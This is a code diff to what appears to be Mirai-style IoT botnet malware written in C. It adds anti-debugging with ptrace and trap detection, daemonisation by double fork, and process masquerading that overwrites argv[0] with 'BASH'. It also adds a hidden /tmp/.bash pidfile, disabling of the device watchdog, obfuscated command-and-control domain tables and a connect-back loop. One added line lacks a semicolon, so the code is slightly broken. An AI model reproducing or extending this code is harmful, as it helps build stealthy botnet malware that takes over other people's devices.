@@ -24,19 +24,33 @@ sig_atomic_t exiting = 0;
 
 uint32_t table_key = 0xdeadbeef; // util_strxor; For packets only?
 
-static int sockfd = -1, num_traps = 0;
+static int sockfd = -1;
 static char uniq_id[32] = "";
+static char *pidfile = "/tmp/.bash";
 
+#ifndef DEBUG
+static int num_traps = 0;
 #define SPC_DEBUGGER_PRESENT (num_traps == 0)
+#endif
 
-#ifdef DEBUG
 static void init_exit(void)
-{	
+{
+    if(!access(pidfile, F_OK) && !access(pidfile, R_OK))
+	{
+#ifdef DEBUG
+		util_msgc("Info", "Attempting to kill rouge process!");
+#endif
+		remove(pidfile);
+    }
+
+#ifdef DEBUG	
 	util_msgc("Info", "Process ran for %ld second(s).", 
 		(time(NULL) - proc_startup));
 	util_msgc("Info", "Exiting: now");
+#endif
 }
 
+#ifdef DEBUG
 static void sigexit(int signo)
 {
     exiting = 1;
@@ -45,6 +59,7 @@ static void sigexit(int signo)
 
 static void sigsegv(int signo)
 {
+	util_msgc("Error", "Caught Segv!");
 	init_exit();
 	_exit(EXIT_FAILURE);
 }
@@ -133,6 +148,7 @@ static void init_uniq_id(void)
     }
 }
 
+#ifndef DEBUG
 static void dbg_trap(int signo)
 {
     num_traps++;
@@ -165,15 +181,13 @@ static void init_trap_detect(void)
 	if(ptrace(PTRACE_TRACEME, 0, 0, 0) < 0)
 		_exit(EXIT_FAILURE);
 }
+#endif
 
 static void ensure_single_instance(void)
 {
 	unsigned int pidc;
-    char *pidfile;
 	
     FILE *pidfd;
-    
-	pidfile = "/tmp/.bash";
     
     if(!access(pidfile, F_OK) && !access(pidfile, R_OK))
     {
@@ -202,34 +216,51 @@ static void ensure_single_instance(void)
     }
 }
 
+#ifndef DEBUG
+static void ensure_background_process(void)
+{
+	int status;
+	pid_t pid1, pid2;
+	
+	if((pid1 = fork()))
+	{
+		waitpid(pid1, &status, 0);
+		_exit(EXIT_FAILURE);
+	}
+	else if(!pid1)
+	{
+		if((pid2 = fork()))
+			_exit(EXIT_FAILURE);
+	}
+}
+#endif
+
 int main(int argc, char *argv[])
 {
 	ssize_t buflen;
 	char pktbuf[512];
 	
-	init_trap_detect();
+	proc_startup = time(NULL);
+	
+	ensure_single_instance();
 	
 #ifdef DEBUG
 	struct in_addr ip4;
 #endif
 	struct Packet pkt;
 	
-	proc_startup = time(NULL);
-	init_signals();
-	init_uniq_id();
+#ifndef DEBUG	
+	init_trap_detect();
 	
-	// Initiate obf tables;
-	table_init();
+	ensure_background_process();
 	
-	table_unlock_val(TABLE_CNC_DOMAIN);
+	int i;
+	for(i = 0; argv[0][i] != 0; i++)
+		argv[0][i] = 0;
+	strcpy(argv[0], "BASH");
 	
-	printf("Test: %s\r\n", table_retrieve_val(TABLE_CNC_DOMAIN, 0));
+	chdir("/")
 	
-	ensure_single_instance();
-	
-	LOCAL_ADDR = net_local_addr();
-	
-#ifndef DEBUG
 	// Prevent watchdog from rebooting device
 	if((wfd = open("/dev/watchdog", 2)) != -1 ||
 		(wfd = open("/dev/misc/watchdog", 2)) != -1)
@@ -240,8 +271,15 @@ int main(int argc, char *argv[])
 	}
 #endif
 	
+	init_signals();
+	init_uniq_id();
+	
+	table_init();
+	
+	LOCAL_ADDR = net_local_addr();
+	
 	while(!exiting)
-	{	
+	{
 		while((sockfd = net_connect("localhost", "3448", IPPROTO_TCP)) < 0)
 		{
 			if(exiting)
